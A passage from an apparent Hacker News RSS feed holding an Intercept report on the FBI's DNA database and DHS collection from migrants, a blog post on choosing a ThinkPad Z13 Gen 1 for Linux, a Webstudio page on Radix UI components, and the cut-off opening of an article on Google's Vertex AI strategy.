<p>In 2021, the FBI <a href="https://www.fbi.gov/news/press-releases/the-fbis-combined-dna-index-system-codis-hits-major-milestone">touted</a> as “a major milestone” the contribution of its 20 millionth DNA profile to the national DNA database, calling it “one of the most successful investigative tools available to U.S. law enforcement.”</p>



<!-- BLOCK(cta)[5](%7B%22componentName%22%3A%22CTA%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) -->

<!-- END-BLOCK(cta)[5] -->



<p>While DNA has played an important role in prosecuting crimes, less than 3 percent of the profiles have assisted in cases, the Bureau’s <a href="https://le.fbi.gov/science-and-lab/biometrics-and-fingerprints/codis/codis-ndis-statistics">data reveals</a>. By comparison, fingerprints collected by the FBI from current and former federal employees linked them to crimes at a rate of 12 percent each year, the Bureau <a href="https://archives.fbi.gov/archives/news/testimony/fbi-fingerprint-program">testified in</a> 2004 — when fingerprint technology was far less sophisticated.</p>



<p>For civil liberties advocates, a government database of everyone’s DNA would be rife for abuses.</p>



<p>“A universal database really just would subvert our ideas of autonomy and freedom and the presumption of innocence. It would be saying that it makes sense for the government to track us at any time based on our private information,” Eidelman told The Intercept, adding that DNA collection presents specific risks to privacy. “Our DNA is personal and sensitive: It can expose our propensity for serious health conditions, family members, and ancestry.”</p>



<h2>DNA Collection From Migrants</h2>



<p>The bulk of the DHS increases stemmed from samples collected from the hundreds of thousands of migrants that ended up arrested or detained by Customs and Border Protection. With the end of <a href="https://theintercept.com/2023/05/14/title-42-arizona-asylum-seekers/">Title 42 expulsions</a>, a <a href="https://theintercept.com/2021/04/18/biden-border-patrol-asylum-title-42/">pandemic-era policy</a> that allowed the U.S. to <a href="https://theintercept.com/2021/04/21/asylum-seekers-violence-biden-title-42/">expel migrants without allowing them to apply for asylum</a> — which finally expired weeks after Wray’s April statement to Congress — the FBI director said he expected the number of new samples to swell to 120,000 a month. (CBP did not respond to a request for comment.)</p>



<p>“This substantial increase has created massive budget and personnel shortfalls for the FBI,” Wray said in his statement. “While the FBI has worked with DHS components to automate and streamline workflows, a backlog of approximately 650,000 samples has developed, increasing the likelihood of arrestees and non-U.S. detainees being released before identification through investigative leads.”</p>



<p>DHS initially sought to collect DNA from detainees in 2009, but the Obama administration <a href="https://www.oig.dhs.gov/sites/default/files/assets/2021-05/OIG-21-35-May21.pdf">exempted</a> the department from collection requirements for non-U.S. detainees. The task would have been too expensive, since Congress had not allocated funding for DNA collection, then-DHS Secretary Janet Napolitano explained.</p>



<p>In 2019, President Donald Trump’s administration ended the exemptions, and DHS <a href="https://www.nytimes.com/2019/10/02/us/dna-testing-immigrants.html">announced</a> that it would collect DNA samples from people arrested or detained by border authorities. At the time, Trump’s policy was widely condemned, including on the grounds that it could lead to widespread <a href="https://www.latimes.com/opinion/story/2019-10-12/trump-migrants-dna-civil-liberties">civil liberties violations</a>.</p>



<p>President Joe Biden has not reversed the decision, causing the government’s DNA database to balloon in size.<a></a></p>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I chose the ThinkPad Z13 Gen1 as my Linux laptop (132 pts)]]></title>
            <link>https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/</link>
            <guid>37312579</guid>
            <pubDate>Tue, 29 Aug 2023 19:21:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/">https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/</a>, See on <a href="https://news.ycombinator.com/item?id=37312579">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>During the second half of 2022, I dusted off my laptop and travelled to three events for the first time in over two years. During these trips, it became apparent that my laptop is not the right tool for the job.</p><p>At <a href="https://events.linuxfoundation.org/archive/2022/kubecon-cloudnativecon-europe/">KubeCon EU 2022</a> my colleague Lindsay brought her <a href="https://www.apple.com/uk/macbook-pro-13/">Apple Macbook Pro M1</a>. It was lightweight, compact, looked fabulous and had epic battery life. Meanwhile, my ThinkPad P1 Gen 1 looked fabulous but it is a bit of a chonker and a massive power pig 🔌🐖 Battery anxiety was constant that week and also on my subsequent trips to <a href="https://www.sreday.com/">SREday 2022</a> and the <a href="https://events.canonical.com/event/2/">Ubuntu Summit 2022</a>. Sensing that 2022 wasn’t an outlier and more travel would be on the cards in 2023 I decided that I wanted some of that thin and light laptop action. In early December 2022, I went hunting for a Linux laptop and this is my journey.</p><h2 id="as-featured-on-linux-matters-">As featured on Linux Matters! 🎙️</h2><p>I recently discussed my hunt for a new Linux Loving Laptop on the <a href="https://linuxmatters.sh/">Linux Matters</a> podcast. <strong>You can hear that discussion with my friends Alan and Mark in <a href="https://linuxmatters.sh/1/">Linux Matters: Mastodon on My Résumé (Episode 1)</a></strong>.</p><p><a href="https://linuxmatters.sh/" target="_blank"><img src="https://linuxmatters.sh/img/episode/linuxmatters-banner-3000x750.webp" alt="Linux Matters Podcast"></a><br><em>Linux Matters Podcast</em></p><h2 id="past-laptop-purchasing-mistakes-">Past laptop purchasing mistakes 😱</h2><blockquote><p>“Those that fail to learn from history are doomed to repeat it” - Winston Churchill.</p></blockquote><p>The requirements for my last two laptop purchases were very different from what I need today; a <a href="https://www.dell.com/en-uk/shop/laptop-computers-2-in-1-pcs/precision-5550-mobile-workstation/spd/precision-15-5550-laptop">Dell XPS 15 5550</a> and <a href="https://www.lenovo.com/gb/en/p/laptops/thinkpad/thinkpadp/thinkpad-p1/22ws2wpp101">ThinkPad P1 Gen1</a> Both have significant power requirements with 15.6" UHD displays and discrete NVIDIA GPUs. The ThinkPad P1 Gen also sports a Xeon CPU ⚡️ These made sense when I bought them, I was travelling one week every month and regularly compiling large applications, building container images, VMs and operating system images. These days I have a <a href="https://www.amd.com/en/products/cpu/amd-ryzen-threadripper-3970x">Threadripper 3970X</a> workstation at home that I can connect to via <a href="https://tailscale.com/">Tailscale</a> to run compute-intensive tasks. I simply don’t need a workhorse 🐴 laptop anymore.</p><h3 id="laptop-criteria-">Laptop criteria 📑</h3><p>I’m deeply impressed with the outstanding work the <a href="https://asahilinux.org/">Asahi Linux</a> team are doing to enable Linux on Apple Silicon Macs, but running Linux on an M1 Mac isn’t viable for me as some hardware support (HDMI for example) is still a work in progress at the time of writing. Not ideal when you’re a conference speaker and running booth demos.</p><p>These are my criteria for the new laptop. Some must-haves, some nice-to-haves and some hard exclusions.</p><ul><li>Fully Linux compatible.<ul><li>Linux pre-installed to demonstrate Linux is fully supported</li></ul></li><li>Full working day battery life; ~8 hours in my opinion.</li><li>Low-power CPU, 35W or under<ul><li>Ideally AMD 6000 series but a 12th Gen Intel as a compromise</li><li>No 11th Gen Intel or AMD 5000 series CPUs will be considered</li></ul></li><li>64GB RAM, will compromise on 32GB RAM</li><li>13" or 14" 1920x1200 matte display<ul><li>No UHD resolutions display will be considered (for power-saving reasons)</li><li>Touch support is a nice-to-have, but not essential</li><li>1920x1080 as a compromise, but nothing lower</li></ul></li><li>No discrete GPU. Again for power-saving reasons.</li><li>USB-C charging</li><li>Dual NVME SSD, or at least a single 2TB (or more) SSD</li><li>Decent keyboard and touchpad</li><li>The Laptop should weigh close to 1kg</li><li>Premium build quality and design (somewhat subjective I know)</li></ul><p>With this list of requirements established, I <a href="https://docs.google.com/spreadsheets/d/1kaB1pxbbYa1ebxeDRTguQ9EZol1EhM-0FE45Da8AOn8/edit#gid=0">started collating Linux laptop comparison notes in this somewhat idiosyncratic spreadsheet</a></p><p><a href="https://docs.google.com/spreadsheets/d/1kaB1pxbbYa1ebxeDRTguQ9EZol1EhM-0FE45Da8AOn8/edit#gid=0" target="_blank"><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/spreadsheet.webp" alt="Linux Laptop Comparison Spreadsheet"></a><br><em>A spreadsheet that probably only makes sense to me</em></p><p>Looking at the list of laptops in the sheet above, you might be wondering why I didn’t consider any laptops from the established dedicated Linux laptop vendors such as <a href="https://www.entroware.com/store/">Entroware</a>, <a href="https://slimbook.es/">Slimbook</a> and <a href="https://starlabs.systems/">StarLabs</a>. Well, I did look at everything they offered at the time and none of them had a model available that met the requirements I’ve outlined above or the estimated dispatch time was nearly half a year.</p><p>I’m not going to elaborate on the rationale behind ruling certain laptop models in or out, but I will say this; I was very impressed to see <a href="http://lenovo.com/linux"><strong>every laptop in the Lenovo ThinkPad lineup had a Linux pre-install option</strong></a> of either <a href="https://ubuntu.com/">Ubuntu</a> or <a href="https://getfedora.org/">Fedora</a> in “Build YourPC” system configurator. While comparing the power requirements of Intel’s i7-12xx series and AMD’s 68x0 series CPU at the time, I was sold on the impressive battery endurance of AMD’s offerings and the superior integrated graphics, so I excluded any laptop with Intel CPUs quite early on.</p><h2 id="lenovo-thinkpad-z13-gen-1-with-ubuntu-pre-installed">Lenovo ThinkPad Z13 Gen 1 with Ubuntu pre-installed</h2><p>I went with the <a href="https://www.lenovo.com/gb/en/p/laptops/thinkpad/thinkpadz/thinkpad-z13-(13-inch-amd)/21d2cto1wwgb1">ThinkPad Z13 Gen 1</a> with Ubuntu pre-installed, and the <a href="https://www.lenovo.com/gb/en/p/laptops/thinkpad/thinkpadt/thinkpad-t14s-gen-3-(14-inch-amd)/len101t0015">ThinkPad T14s Gen 3</a> was runner-up in my selection process.</p><h3 id="specifications-">Specifications 📝</h3><p>The key specifications for the laptop I ordered are AMD Ryzen 7 PRO 6850U CPU, 32 GB LPDDR5-6400MHz (Soldered), 1 TB SSD M.2 2242 PCIe Gen4, 13.3" WUXGA (1920 x 1200), IPS, Anti-Glare, Non-Touch display weighing in at 1.19kg. I think this configuration hits the sweet spot for battery endurance, more on that later.</p><p>I’m not a fan of the increasing trend of soldering RAM on motherboards, but that was common across all the models of laptops I was considering. If <a href="https://frame.work/gb/en">Framework</a> had offered an AMD 6000 series CPU option at the time, I would’ve had a Framework laptop on my short list as the modular design of the Framework laptops is very appealing.</p><p>And yes, I did make a compromise with the laptop specifications; that 1TB M.2 SSD is below my minimum requirement of 2TB. I did do my homework though and will present my creative upgrade solution in a future blog post. <a href="https://wimpysworld.com/posts/rss.xml">Like and Subscribe</a> 😉</p><h3 id="build-quality--design-">Build Quality &amp; Design 💻️</h3><p>Without a doubt, the ThinkPad Z13 Gen 1 is a gorgeous laptop. I do not have enough superlatives to express just how much I love it. It is, in my option, an almost flawless design. Exactly the compact form factor laptop I was seeking; it’s beautiful to look at from any angle and a delight to use. Here are some highlights.</p><p><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/ThinkPad_Z13_Gen_1_CT1_02.webp" alt="ThinkPad Z13 Gen 1"><br><em>ThinkPad Z13 Gen 1</em></p><p>The laptop is engineered from 75% recycled aluminium and 95% recycled plastics, then boxed in 100% renewable, compostable packaging. The touchpad is sublime and amazingly 120mm wide on the compact laptop. The haptic touch is simply excellent. The touchpad is the most Macbook-like touchpad I’ve used on any PC and it is so good it has caused me to change what desktop environment I now use. More on this in a future blog post. However, there is currently no Linux software to <a href="https://psref.lenovo.com/syspool/Sys/PDF/datasheet/ThinkPad_Z_Series_Haptic_TouchPad_Settings.pdf">configure the haptic touchpad settings</a> such as click force and touchpad feedback intensity but I’ve been perfectly happy with the defaults. If you do dual boot Windows the haptic settings configured via Windows are stored on the device and carry over to Linux.</p><p>The Keyboard is an excellent low-profile design, each key has ~1.2mm of travel which is the same as the actuation point on my Razer Huntsman V2 TKL keyboards with opto-mechanical switches. Most importantly the Fn key is in the correct place on the Z13 and not where ThinkPads have been incorrectly plonking it for years. Fight me! 🥊 If you are a long-time ThinkPad owner, it is likely you’ll hate the idea of the keyboard and touchpad on the Z13 since it is quite a departure from the traditional design. But I went into this with my eyes 👀 open and have watched and read many reviews.</p><p><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/ThinkPad_Z13_Gen_1_CT4_01.webp" alt="Correct Fn key placement on ThinkPad Z13 Gen 1"><br><em>"This is the way"</em></p><p>The Display is bright (400nits), anti-reflective and anti-smudge, covers 100% of the sRGB colour gamut and the laptop is perfectly balanced so it can be opened one-handed. I’m embracing the compact, thin and light lifestyle; so the two USB-C ports are fine with me as I’ve chosen a laptop configuration with excellent battery endurance (more on that in a bit) and plan to use it completely untethered most of the time with cables and adapters only plugged in for very specific tasks and overnight recharging.</p><p>I do have one niggle though; there is an unusable 2242 M.2 slot on the motherboard. It is only intended for use with select models of WWAN cards, none of which are a configuration option for the UK models of the Z13. It doesn’t look like the antenna is wired in either, so even if you do get a supported WWAN card aftermarket it is unlikely to work well; if at all. I can share my iPhone’s mobile service via Wifi, so not a deal breaker in that regard but it is rather annoying to have an M.2 slot on the motherboard and nothing I can do with it.</p><h3 id="ubuntu-pre-install-experience-">Ubuntu pre-install experience 👌</h3><p>It is worth noting that at the time of purchase, selecting Ubuntu or Fedora in the system configuration on the Lenovo website applied a £155 discount! 🤑 Choosing Ubuntu or Fedora across the ThinkPad line applies a discount, although the amount varies based on the model.</p><p>All OEMs that partner with Ubuntu get an OEM designation for each device officially endorsed and supported by Canonical. The ThinkPad Z13 Gen 1 is known as <em>Sutton Newell Abe</em> and the <code>oem-sutton.newell-abe-meta</code> package (along with the associated OEM PPA) provides the device-specific hardware enablement and power management tuning.</p><p><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/oem-name.webp" alt="ThinkPad Z13 Gen 1 (Sutton Newell Abe)"><br><em>ThinkPad Z13 Gen 1 is known as Sutton Newell Abe for OEM enablement</em></p><p>The OEM image of Ubuntu differs from the standard Ubuntu image in a few ways. The most obvious is that OEM image comes with recovery media creation pre-installed. This is a great feature and I highly recommend you use it to create a recovery USB stick, either during the initial setup or post-setup. The OEM image also comes with Chromium and Firefox installed, as opposed to just Firefox in the downloadable release of Ubuntu. IIRC, this is because Chromium has traditionally worked better with touchscreen laptops. The fingerprint reader works. I was able to enrol fingerprints quickly and authenticate GDM logins. But the biometric support does not extend throughout the system; Ubuntu Software doesn’t integrate with the fingerprint reader, nor does <code>snapd</code> or any other privilege escalation.</p><p>I also experienced the touchpad becoming unresponsive, requiring a click to “unfreeze” it. This happens quite frequently and detracts from what is otherwise an excellent, class-leading, touchpad. I suspect it is overly aggressive power management settings in the OEM image, but I didn’t investigate beyond that hunch. Both these issues with the fingerprint reader and touchpad are Ubuntu-specific and nothing related to the actual hardware. Both issues are absent when running NixOS.</p><p>Having a tier-1 vendor such as Lenovo ship a laptop with Ubuntu pre-installed has the benefit of great firmware support. I’ve received several firmware updates since I got the laptop, and they have all applied without issue.</p><p><img src="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/firmware-update.webp" alt="ThinkPad Z13 Gen 1 firmware updates on Ubuntu"><br><em>Firmware updates for the ThinkPad Z13 Gen 1 on Ubuntu 20.04</em></p><h4 id="why-not-ubuntu-2204-">Why not Ubuntu 22.04? 🤔</h4><p>My Z13 was shipped with Ubuntu 20.04.4 with OEM optimised Linux kernel 5.14.0-1054-oem. Some might be perplexed (or annoyed) that it didn’t come with Ubuntu 22.04, given it was ordered in late 2022. I used to work for Canonical, and during that time worked with Lenovo to enable Ubuntu on ~60 of their laptops and workstations between 2019 and 2021, so I do have some insight into how this process works. It simply boils down to how the factory image certification process works, and once an image is qualified that is what ships on the device for the duration of its availability. Re-certification adds cost and takes time, so it’s extremely rare for a device to have a revised factory image qualified once it has gone on sale.</p><p>Upgrading to Ubuntu 22.04 LTS worked flawlessly, full audio support was restored and no other hardware supported regressed. Brilliant.</p><h4 id="linux-kernel-61-">Linux Kernel 6.1 🌰</h4><p>The pre-installed Ubuntu and Fedora images for the Z13 come with kernels that have backported patches applied to fully support the device. If you buy a ThinkPad Z13 and plan to run another Linux distro on it, make sure you can install Linux kernel version 6.1 or newer. This is to ensure the Qualcomm Wi-Fi 6E NFA725A 2x2 AX chipset is fully supported and that the required patches to properly suspend and resume are available.</p><h3 id="battery-endurance-">Battery endurance 🔋</h3><p>This is, after all, my most important selection criteria. The conclusion here is simple: <strong>11 hours</strong> ⏱️</p><p>This is 11 hours of mixed-use. Coding in Visual Studio Code. Chatting in Slack and Discord. Video calls in Google Meet and Zoom. Compiling software. Some screen capture with OBS Studio and basic video editing with <a href="https://shotcut.org/">Shotcut</a>. Closing the lid of the laptop and leaving it suspended for 24 hours depletes the battery by ~4% which is about 2 Wh. Very respectable. I haven’t felt the need to profile power consumption or tweak anything as I’m get plenty of untethered compute time. I’m very happy with the battery life, typically charging the laptop overnight while I sleep and running it all day battery only.</p><h2 id="whats-next-">What’s next? 🔮</h2><p>As noted, I did compromise on the 1TB M.2 SSD. I’ve come up with an aftermarket solution to upgrade to 2TB which I will post about soon. I chose a laptop pre-installed with Linux for two reasons:</p><ul><li>Support companies shipping a Linux operating system pre-installed on their laptops and workstations</li><li>Hard proof Linux works on their hardware</li></ul><p>After using Ubuntu for a few weeks I switched to NixOS. I will be posting about my experience with NixOS on the Z13 in a future blog post and <a href="https://twitch.tv/WimpysWorld">will likely livestream about it on Twitch</a> as well. TL;DR NixOS 22.11 has fewer issues than Ubuntu 22.04 on the ThinkPad Z13 Gen 1.</p><p>The ThinkPad Z13 Gen 1 is an excellent laptop for my requirements, and I have no regrets. If I were to buy I laptop pre-installed with a Linux distro in the future, I might go for Fedora, just so I can see what the OEM experience is like with Fedora.</p><p>Since I purchased the Z13, <a href="https://frame.work/gb/en/blog/framework-laptop-13-with-13th-gen-intel-core-and-amd-ryzen-7040-series">Framework has announced AMD 7040-series powered laptops</a> are coming later in 2023; and I’m not sure I can resist…</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Webstudio: Open-source WYSIWYG adds Radix UI elements (107 pts)]]></title>
            <link>https://webstudio.is/radix</link>
            <guid>37312523</guid>
            <pubDate>Tue, 29 Aug 2023 19:17:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://webstudio.is/radix">https://webstudio.is/radix</a>, See on <a href="https://news.ycombinator.com/item?id=37312523">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-ws-id="A90KV-H6l4EtPjGvDfmIb" data-ws-component="Box"><section data-ws-id="qPxsHRgrqNOUYL23JwkoZ" data-ws-component="Box"><p><img alt="Example navigation" data-ws-id="GLp-g6baVbhd2GatLwwYf" data-ws-component="Image" src="https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=3840&amp;quality=80&amp;format=auto" sizes="(min-width: 1280px) 50vw, 100vw" srcset="https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=384&amp;quality=80&amp;format=auto 384w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=640&amp;quality=80&amp;format=auto 640w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=750&amp;quality=80&amp;format=auto 750w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=828&amp;quality=80&amp;format=auto 828w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=1080&amp;quality=80&amp;format=auto 1080w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=1200&amp;quality=80&amp;format=auto 1200w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=1920&amp;quality=80&amp;format=auto 1920w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=2048&amp;quality=80&amp;format=auto 2048w, https://webstudio.is/cgi/image/Radix_Feature_1_JAEEfD_-59xDhumeZBODb.svg?width=3840&amp;quality=80&amp;format=auto 3840w" decoding="async" loading="lazy"></p><div data-ws-id="UuT__1n8EEjjY_DYbJOTj" data-ws-component="Box"><h2 data-ws-id="kiu-WHTXm3XySGARE9OmL" data-ws-component="Heading">Build advanced user interfaces</h2><p data-ws-id="PXdEy63pB8giS0zZJLaMn" data-ws-component="Paragraph">Design unique user interfaces with dropdowns, dialogs, forms, navigation menus, tooltips, and more. Simply drag, drop and style the <a href="https://www.radix-ui.com/primitives" target="_blank" data-ws-id="GHuvkPynGQqMCV2g1AwXN" data-ws-component="RichTextLink">Radix</a> component on your canvas, without writing any code.</p></div></section><section data-ws-id="OxykbtzhjIGKxOZJDwXa6" data-ws-component="Box"><p><img alt="Accessibility visualization" data-ws-id="_ggJVtGYujEQJ-E2AkVQW" data-ws-component="Image" src="https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=3840&amp;quality=80&amp;format=auto" sizes="(min-width: 1280px) 50vw, 100vw" srcset="https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=384&amp;quality=80&amp;format=auto 384w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=640&amp;quality=80&amp;format=auto 640w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=750&amp;quality=80&amp;format=auto 750w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=828&amp;quality=80&amp;format=auto 828w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=1080&amp;quality=80&amp;format=auto 1080w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=1200&amp;quality=80&amp;format=auto 1200w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=1920&amp;quality=80&amp;format=auto 1920w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=2048&amp;quality=80&amp;format=auto 2048w, https://webstudio.is/cgi/image/Radix_Feature_2_bcb1jwaF8jTNOc89B7rWc.svg?width=3840&amp;quality=80&amp;format=auto 3840w" decoding="async" loading="lazy"></p><div data-ws-id="sYSpZHO8lgzlp3NEPQqWo" data-ws-component="Box"><h2 data-ws-id="N6_UtgIddVKz4qDDcIZ__" data-ws-component="Heading">Accessible out of the box</h2><p data-ws-id="gJyjQFoZFsF5WNAOOhshd" data-ws-component="Paragraph">With built-in accessibility and <a href="https://www.w3.org/WAI/ARIA/apg/" data-ws-id="MxhrocaG_BJ3SYvAaTk8u" data-ws-component="RichTextLink">WAI-ARIA</a> specification, <a href="https://www.radix-ui.com/primitives" target="_blank" data-ws-id="WaRlx9thVl8eJFC71t97i" data-ws-component="RichTextLink">Radix UI</a> ensures that your designs are not only visually appealing but also accessible to all users, regardless of their abilities.</p></div></section><section data-ws-id="HhLrP84hMD-dxfemnxUEw" data-ws-component="Box"><p><img alt="Webstudio Components and code example" data-ws-id="gWQxTw_tfcrBjy4dFn2p8" data-ws-component="Image" src="https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=3840&amp;quality=80&amp;format=auto" sizes="(min-width: 1280px) 50vw, 100vw" srcset="https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=384&amp;quality=80&amp;format=auto 384w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=640&amp;quality=80&amp;format=auto 640w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=750&amp;quality=80&amp;format=auto 750w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=828&amp;quality=80&amp;format=auto 828w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=1080&amp;quality=80&amp;format=auto 1080w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=1200&amp;quality=80&amp;format=auto 1200w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=1920&amp;quality=80&amp;format=auto 1920w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=2048&amp;quality=80&amp;format=auto 2048w, https://webstudio.is/cgi/image/Radix_Feature_3_eoqAOesxoyohzxto346hk.svg?width=3840&amp;quality=80&amp;format=auto 3840w" decoding="async" loading="lazy"></p><div data-ws-id="BBLBWcSJoFf8KAS2g210A" data-ws-component="Box"><h2 data-ws-id="9hyTpvpcNWru2KZbcPbnp" data-ws-component="Heading">Developer superpowers for designers</h2><p data-ws-id="5ni4nZB40PTx8DGYPXOrg" data-ws-component="Paragraph">Radix UI simplifies the visual development process by handling accessibility details and complex logic, so you can focus on addressing unique design challenges.</p></div></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[MapReduce, TensorFlow, Vertex: Google's bet to avoid repeating history in AI (122 pts)]]></title>
            <link>https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello</link>
            <guid>37312385</guid>
            <pubDate>Tue, 29 Aug 2023 19:08:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello">https://www.supervised.news/p/mapreduce-tensorflow-bard-also-hello</a>, See on <a href="https://news.ycombinator.com/item?id=37312385">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png" width="538" height="538" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1024,&quot;width&quot;:1024,&quot;resizeWidth&quot;:538,&quot;bytes&quot;:1321862,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa83e3e25-39d6-4813-bcc8-be9e0bb7bafc_1024x1024.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>a historian staring at a bookshelf, blade runner 2049 aesthetic, deep blue hue — midjourney</figcaption></figure></div><p>Google is in the middle of trying to avoid repeating history when releasing its industry-altering technology.</p><p><span>Transformers, the foundational technique behind modern AI, represents the risk of a </span><em>third</em><span> time Google has created a groundbreaking technique and let its competitors run off with the spoils. It happened in the early 2000s, with the release of the original MapReduce infrastructure. And it happened again with the release of TensorFlow, a framework that made deep learning more widely accessible and arguably triggered the first wave of modern machine learning, in 2015.</span></p><p>Its bid to avoid that with Transformers starts, more or less, today with its massive bet on its Google Cloud AI infrastructure Vertex AI. The company announced a large number of upgrades and the availability of many models—including Llama 2—to serve through its cloud infrastructure. </p><p>Google Cloud is at the core of its attempt to reclaim its title as the most powerful AI company on the planet, despite its constant series of missteps in the past years. But in conversations with developers and sources, Vertex AI has been one of the most confusing 